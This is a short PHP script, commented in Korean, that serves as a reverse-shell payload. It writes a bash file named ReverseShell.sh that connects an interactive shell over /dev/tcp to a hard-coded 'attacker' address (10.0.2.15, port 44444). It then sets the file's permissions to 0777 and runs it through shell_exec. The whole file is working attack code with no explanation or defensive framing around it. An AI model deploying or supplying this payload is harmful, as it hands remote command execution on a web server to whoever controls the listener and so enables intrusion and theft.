<?php
$attacker_ip = '10.0.2.15';
$attacker_port = '44444';
$command = "#!/bin/bash\nattacker_ip=$attacker_ip\nattacker_port=$attacker_port\n/bin/bash -c /bin/bash -i >& /dev/tcp/\$attacker_ip/\$attacker_port 0>&1";

// ReverseShell.sh 파일 생성
file_put_contents('ReverseShell.sh', $command);

// 실행 권한 부여
chmod('ReverseShell.sh', 0777);

// 실행
shell_exec('./ReverseShell.sh');
?>
